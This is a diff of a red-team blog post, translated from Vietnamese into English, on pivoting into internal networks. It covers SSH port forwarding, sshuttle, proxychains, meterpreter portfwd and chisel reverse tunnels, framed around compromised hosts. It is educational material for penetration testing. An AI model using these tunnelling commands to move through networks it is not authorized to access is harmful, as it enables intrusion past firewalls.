@@ -10,65 +10,65 @@ tags: [
 ]
 ---
 ## Intro
-- Có rất nhiều bài viêt,blog nói về việc tấn công,xâm nhập mạng nội bộ trên Internet, nhưng hầu hết trong số chúng tập trung vào việc sử dụng các công cụ, các nguyên tắc, tình huống ít được đề cập, giải thích nhiều. Bài viết này tôi sẽ thảo luận về nguyên tắc tấn công mạng nội bộ đa dạng, thiết kế linh hoạt sơ đồ tấn công mạng nội bộ tương ứng theo các tình huống của mạng nội bộ khác nhau. Đây cũng là một trong những chủ đề tôi yêu thích nhất trong an ninh mạng và hoạt động của red team nói chung.
+- There are plenty of articles and blogs on the Internet talking about attacking and penetrating internal networks, but most of them focus on using the tools, while the principles and scenarios are rarely mentioned or explained much. In this post I'll discuss the principles of attacking internal networks in various ways, flexibly designing an internal-network attack diagram to match the different internal-network scenarios. This is also one of my favorite topics in cybersecurity and red team operations in general.
 
-- Tấn công,xâm nhập mạng nội bộ là sử dụng các công nghệ *tunnel* khác nhau để vượt qua sự phong tỏa, phát hiện của tường lửa với các giao thức được tường lửa cho phép để đạt được quyền truy cập vào mạng mục tiêu bị chặn.
+- Attacking and penetrating an internal network means using various *tunnel* technologies to get past the firewall's blocking and detection, using protocols the firewall allows, to gain access to the blocked target network.
 
-- Công nghệ *tunnel* (đường hầm) là một cách để truyền dữ liệu giữa các mạng bằng cách sử dụng cơ sở hạ tầng của Internet. Dữ liệu được truyền bằng *tunnel* có thể là các *frame* dữ liệu hoặc các *package* của các protocol khác nhau. *Tunnel protocol* đóng gói lại các *frame* dữ liệu hoặc *package* dữ liệu của các *protocol* khác này trong một *header* mới để truyền. *Header* mới cung cấp thông tin định tuyến để dữ liệu được đóng gói có thể được truyền qua Internet. Các package dữ liệu đóng gói được định tuyến giữa hai *endpoint* của *tunnel* thông qua mạng internet. Đường dẫn logic mà package dữ liệu đã đóng gói được truyền qua Internet được gọi là *tunnel*. Khi kết thúc, dữ liệu sẽ được giải nén và chuyển tiếp đến đích cuối cùng. Lưu ý rằng công nghệ tunnel đề cập đến toàn bộ quá trình bao gồm đóng gói, truyền và giải nén dữ liệu.
+- *Tunnel* technology is a way to transmit data between networks using the Internet's infrastructure. The data transmitted through a *tunnel* can be data *frames* or *packages* of different protocols. The *tunnel protocol* re-encapsulates the data *frames* or data *packages* of these other *protocols* inside a new *header* for transmission. The new *header* provides routing information so that the encapsulated data can be transmitted over the Internet. The encapsulated data packages are routed between the two *endpoints* of the *tunnel* through the internet. The logical path along which the encapsulated data package is transmitted over the Internet is called a *tunnel*. At the end, the data is decapsulated and forwarded to the final destination. Note that tunnel technology refers to the whole process including encapsulating, transmitting and decapsulating the data.
 
-- Các công nghệ *tunnel* mà chúng tôi thường sử dụng để xâm nhập mạng nội bộ bao gồm dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel và các giao thức khác mà tường lửa cho phép.
+- The *tunnel* technologies we commonly use to penetrate internal networks include dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel and other protocols the firewall allows.
 
-- Các công nghệ tunnel này có thể được phân lớp theo lớp giao thức:
-  - Netword layer tunnel: ICMP tunnel, v.v.
+- These tunnel technologies can be classified by protocol layer:
+  - Netword layer tunnel: ICMP tunnel, etc.
   - Transport layer tunnel: TCP tunnel, UDP tunnel
-  - Application layer tunnel: HTTP, DNS, SSH và các tunnel khác
+  - Application layer tunnel: HTTP, DNS, SSH and other tunnels
 ## Tools for Tunneling
 ### SSH Tunnel
-- Vì đây là một phần quan trọng và sử dụng cực kì hữu ích trong thực tế nên tôi sẽ nói kĩ về nó. Nó nằm trong Application layer tunnel.
+- Since this is an important part and extremely useful in practice, I'll go into detail about it. It belongs to the Application layer tunnel.
 #### Local Port Forwarding
 - `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT`\
--> Tất cả traffic đến [LOCAL_IP:]LOCAL_PORT sẽ được forward đến DESTINATION:DESTINATION_PORT qua ssh tunnel
+-> All traffic to [LOCAL_IP:]LOCAL_PORT will be forwarded to DESTINATION:DESTINATION_PORT through the ssh tunnel
 
 - `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT -L [LOCAL_IP2:]LOCAL_PORT2:DESTINATION2:DESTINATION_PORT2`\
 -> Multi local port forwarding
 
 - `ssh user@10.66.66.4 -CNfg -L 13389:127.0.0.1:3389`\
--> Tất cả traffic đến 13389 trên localhost sẽ được forward tới 127.0.0.1:3389 trên server
+-> All traffic to 13389 on localhost will be forwarded to 127.0.0.1:3389 on the server
 
 - `ssh user@10.66.66.4 -CNfg -L 13389:10.9.9.123:3389`\
--> Tất cả traffic đến 13389 trên localhost sẽ được forward tới 10.9.9.123:3389 nếu từ server có thể kết nối đến 10.9.9.123:3389
+-> All traffic to 13389 on localhost will be forwarded to 10.9.9.123:3389 if the server can connect to 10.9.9.123:3389
 
 - `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389`\
--> Có thể forward port ssh từ local lên server public (remote port forwarding) để tất cả mọi người từ bên ngoài đều có thể kết nối được đến 10.9.9.123:3389 (mạng local)
+-> You can forward the ssh port from local up to a public server (remote port forwarding) so that everyone from the outside can connect to 10.9.9.123:3389 (the local network)
 
 - `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389 -L 13390:10.9.9.123:3390 -L 13391:10.9.9.123:3391`\
--> Ví dụ multi local port forwarding\
-- **Local port forwarding thường được sử dụng để kéo một port từ server hoặc trong vùng mạng với server -> local**
+-> Example of multi local port forwarding\
+- **Local port forwarding is commonly used to pull a port from the server or from within the server's network -> local**
 
-- **Ví dụ thực tế**
-- Kịch bản:\
+- **Practical example**
+- Scenario:\
       &nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
 10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
      -----------------------X-------------------------------------->   tcp/445\
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/445\
      -----------V-----------------> tcp/22
-- Trong trường hợp này : Khi ta khai thác và chiếm quyền kiểm soát được máy chủ 192.168.10.10 của mục tiêu. 172.16.10.10 là một máy chủ nội bộ, không có kết nối internet và không thể kết nối đến mạng bên ngoài. Giả sử nó đang mở port 445. Vậy làm sao có thể khai thác và enum thông tin của nó từ máy của chúng ta?
+- In this case: once we exploit and take control of the target's server 192.168.10.10. 172.16.10.10 is an internal server, with no internet connection and unable to connect to the outside network. Suppose it has port 445 open. So how can we exploit and enum its information from our machine?
 - From KALI : `ssh -N -L 0.0.0.0:4445:172.16.10.10:445 root@192.168.10.10`
-- Sau khi sử dụng lệnh này trên máy KALI chúng ta có thể truy cập 172.16.10.10:445 từ `localhost:445`
+- After using this command on the KALI machine, we can access 172.16.10.10:445 from `localhost:445`
 #### Remote Port Forwarding
 - `ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER`\
--> Tất cả traffic đến [REMOTE:]REMOTE_PORT trên server sẽ forward đến DESTINATION:DESTINATION_PORT (client)
+-> All traffic to [REMOTE:]REMOTE_PORT on the server will be forwarded to DESTINATION:DESTINATION_PORT (client)
 
 - `ssh user@remote.host -CNfg -R 8080:127.0.0.1:3000`\
--> Tất cả traffic đến port 8080 trên server sẽ được forward đến 127.0.0.1:3000 trên máy của bạn
+-> All traffic to port 8080 on the server will be forwarded to 127.0.0.1:3000 on your machine
 
 - `ssh -tt -R 3389:localhost:3389 root@103.81.86.132 -p 9020 ssh -L 103.81.86.132:3389:127.0.0.1:3389 root@localhost -p 9020`\
--> Ví dụ bạn có một server public. Bạn có thể sử dụng lệnh này để kéo port 3389 từ local lên server để mọi người từ internet có thể kết nối đến (trong trường hợp này là remote desktop). Vì remote port fowarding mặc định chỉ foward đến interface 127.0.0.1 nên tả sẽ sử dụng thêm một lệnh local port fowarding nữa để chuyển traffic qua interface public.
+-> For example, you have a public server. You can use this command to pull port 3389 from local up to the server so that everyone from the internet can connect to it (in this case remote desktop). Since remote port forwarding by default only forwards to the 127.0.0.1 interface, we'll use one more local port forwarding command to move the traffic through the public interface.
 
-- **Remote port forwarding thường được sử dụng để kéo 1 port từ local hoặc trong vùng mạng của local -> server**
+- **Remote port forwarding is commonly used to pull a port from local or from within the local network -> server**
 
-- **Ví dụ thực tế**
-- Kịch bản:\
+- **Practical example**
+- Scenario:\
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]               
 103.81.86.132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10      
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Compromised)\
@@ -76,15 +76,15 @@ tags: [
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------X----------> tcp/3306\
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ANY <------V--------------
 - From Debian : `ssh -N -R 103.81.86.132:2221:127.0.0.1:3306 kali@10.10.10.10`
-- Bây giờ trên Kali, khi traffic đến tcp / 2221, nó sẽ chuyển đến tcp / 3306 của Debian
+- Now on Kali, when traffic comes to tcp / 2221, it will be routed to tcp / 3306 on Debian
 #### Dynamic Port Forwarding
 - `ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER`
 - `ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1`
--> Lúc này 127.0.0.1:7777 sẽ đóng vai trò như một SOCKS proxy forward mọi traffic qua nó đến vùng mạng của server
-- **Dymanic port forwarding được sử dụng để tạo SOCKS proxy để truy cập mọi IP, port trên mạng server qua SOCKs proxy**
+-> At this point 127.0.0.1:7777 will act as a SOCKS proxy forwarding all traffic through it to the server's network
+- **Dynamic port forwarding is used to create a SOCKS proxy to access any IP and port on the server network through the SOCKS proxy**
 
-- **Ví dụ thực tế**
-- Kịch bản:\
+- **Practical example**
+- Scenario:\
 &nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
 10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
 -------------------------X-------------------------------------->   tcp/445\
@@ -92,14 +92,14 @@ tags: [
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/any\
      -----------V-----------------> tcp/22
 - From Kali: `ssh -N -D 127.0.0.1:8080 user@192.168.10.10`
-- Lúc này 127.0.0.1:8080 đóng vai trò như một SOCKS proxy forward toàn bộ traffic đi qua nó tới vùng mạng mà 192.168.10.10 có thể kết nối đến.
-- Nếu là http traffic có thể sử dụng FoxyProxy, traffic khác có thể sử dụng proxychains
-- Cấu hình /etc/proxychains.conf:
+- At this point 127.0.0.1:8080 acts as a SOCKS proxy forwarding all traffic through it to the network that 192.168.10.10 can connect to.
+- For http traffic you can use FoxyProxy; for other traffic you can use proxychains
+- Configure /etc/proxychains.conf:
 ```bash 
 ...
 socks4 127.0.0.1 8080
 ```
-- Scan nmap qua proxychains: `proxychains --top-ports -sT -Pn 172.16.10.10`
+- nmap scan through proxychains: `proxychains --top-ports -sT -Pn 172.16.10.10`
 #### Options
 - Options:\
 -C Requests compression of all data (including stdin, stdout, stderr, and data for forwarded X11 and TCP connections)\
@@ -110,20 +110,20 @@ socks4 127.0.0.1 8080
 -D Local port forwarding (SOCKS proxy)\
 -p port
 #### Sshuttle
-- Một công cụ rất hay chúng ta cũng có thể sử dụng là sshuttle (https://github.com/sshuttle/sshuttle)
+- A very nice tool we can also use is sshuttle (https://github.com/sshuttle/sshuttle)
 - Install
   - Debian    : `apt-get install sshuttle -y`
   - Rpm-based : `yum install sshuttle`
 - Usage
-  - `sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv` (mọi kết nối sẽ đi qua server)
-  - `sshuttle -r sean@10.11.1.251 10.1.1.27` (tạo kết nối trực tiếp đến 10.1.1.27 thông qua trung gian 10.11.1.251)
-  - `sshuttle -r sean@10.11.1.251 10.1.1.27/24` (tạo kết nối trực tiếp đến 10.1.1.27/24 thông qua trung gian 10.11.1.251)\
-  - `nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24`(có thể sử dụng nmap scan trực tiếp không cần qua proxy như ssh dynamic port fowarding)
-#### Chú ý
-- Trong thực tế giả sử bạn có quyền truy cập máy chủ thông qua một lỗ hổng web hay ứng dụng, chúng ta không có thông tin đăng nhập của ssh. Bạn hoàn toàn có thể tạo một cặp key từ máy chủ và có thể ssh qua private key của nó với options `-i` như phần đầu tiên trong bài viết này của tôi :\
+  - `sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv` (all connections will go through the server)
+  - `sshuttle -r sean@10.11.1.251 10.1.1.27` (create a direct connection to 10.1.1.27 through the intermediary 10.11.1.251)
+  - `sshuttle -r sean@10.11.1.251 10.1.1.27/24` (create a direct connection to 10.1.1.27/24 through the intermediary 10.11.1.251)\
+  - `nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24` (you can use nmap to scan directly without going through a proxy, like ssh dynamic port forwarding)
+#### Note
+- In practice, suppose you have access to a server through a web or application vulnerability but we don't have ssh login credentials. You can absolutely generate a key pair from the server and ssh in using its private key with the `-i` option, like the first part of this post of mine :\
 https://tranquac.com/posts/2021/06/linux-backdoors/
 ### Netword Layer Tunnel
-- Tôi sẽ giới thiệu một số công cụ các bạn có thể tự nghiên cứu và thực hành
+- I'll introduce some tools you can research and practice with on your own
 - ICMP tunnel:
   - icmpsh (https://github.com/bdamele/icmpsh)
   - icmptunnel (https://github.com/DhavalKapil/icmptunnel)
@@ -138,7 +138,7 @@ https://tranquac.com/posts/2021/06/linux-backdoors/
   - NATBypass
   - iox
 ### Application Layer Tunnel
-- HTTP, DNS, SSH và các tunnel khác. SSH tôi đã nói rất chi tiết ở trên.
+- HTTP, DNS, SSH and other tunnels. I already covered SSH in great detail above.
   - dnscat2
   - dnscat2-powershell
   - dns2tcp
@@ -155,7 +155,7 @@ https://tranquac.com/posts/2021/06/linux-backdoors/
   - s5.go
 ### Other tools pivoting without SSH
 #### Metasploit Framework
-- Khi có shell meterpreter bạn hoàn toàn có thể sử dụng để tạo tunnel dễ dàng. Không cần phải có thông tin đăng nhập giống SSH. Với SSH ta phải có một tài khoản đăng nhập hay private-key SSH của server thì mới có thể kết nối đến và tạo tunnel.
+- Once you have a meterpreter shell you can easily use it to create a tunnel. You don't need credentials like with SSH. With SSH we must have a login account or the server's SSH private key to be able to connect and create a tunnel.
 ```bash
 meterpreter > portfwd -h
 Usage: portfwd [-h] [add | delete | list | flush] [args]
@@ -172,36 +172,36 @@ meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
 [*] Local TCP relay created: 0.0.0.0:3389 >-> 172.16.194.191:3389
 meterpreter > 
 ```
--> Tạo một tunnel forward toàn bộ traffic đến port 3339 trên localhost tới 172.16.194.191 qua pivot là máy đang có shell meterpreter hiện tại.Nó cũng tương tự SSH local port forwarding vậy đó.
+-> Creates a tunnel forwarding all traffic to port 3339 on localhost to 172.16.194.191 through the pivot, which is the machine currently holding the meterpreter shell. It's similar to SSH local port forwarding.
 ```bash
 meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191
 [*] Successfully stopped TCP relay on 0.0.0.0:3389
 meterpreter > 
 ```
--> Hủy một tunnel
-- Liệt kê tất cả tunnel : `meterpreter > portfwd list`
-- Xóa tất cả tunnel : `portfwd flush`
-- Xem chi tiết hơn tại : https://www.offensive-security.com/metasploit-unleashed/portfwd/
+-> Remove a tunnel
+- List all tunnels : `meterpreter > portfwd list`
+- Delete all tunnels : `portfwd flush`
+- See more details at : https://www.offensive-security.com/metasploit-unleashed/portfwd/
 #### Chisel
 - A fast TCP/UDP tunnel over HTTP (https://github.com/jpillora/chisel)
-- Sử dụng thông thường: Ví dụ Kali hoặc máy tấn công khác có IP là 10.10.15.13, máy client có IP là 10.10.10.10.
-- Trên máy tấn công bắt đầu tạo chisel server lắng nghe trên port 8000: 
+- Typical usage: for example Kali or another attacking machine has IP 10.10.15.13, and the client machine has IP 10.10.10.10.
+- On the attacking machine, start a chisel server listening on port 8000: 
 ```bash
 ./chisel server -p 8000 --reverse
 ```
-- Trên máy client:
+- On the client machine:
 | Command                                                  | Description                                                     |
 | --------------------------------------------             | ---------------------------------------------------------       |
 | chisel client 10.10.15.13:8000 R:80:127.0.0.1:80 R:389:localhost:389          | Listen on Kali 80,389, forward to localhost port 80,389 on client       |
 | chisel client 10.10.15.13:8000 R:4444:10.10.10.214:80    | Listen on Kali 4444, forward to 10.10.10.214 port 80            |
 | chisel client 10.10.15.13:8000 R:socks                   | Create SOCKS5 listener on 1080 on Kali, proxy through client    |
-- Lưu ý là Chisel phải chạy cả trên server và client
+- Note that Chisel must run on both the server and the client
 #### Ssf
 - https://github.com/securesocketfunneling/ssf
 ## Create SOCKS Proxy to Attack Internal Network
 ### Ssh
 - [Dynamic Port Porwarding](#dynamic-port-forwarding)
-- Cũng có thể tạo một SOCKS proxy là chính máy của bạn: `ssh user@localhost -CNfg -D 9000`
+- You can also create a SOCKS proxy that is your own machine: `ssh user@localhost -CNfg -D 9000`
 - [Sshuttle](#sshuttle)
 ### Powershell
 - https://www.varonis.com/blog/nmap-reverse-proxies/
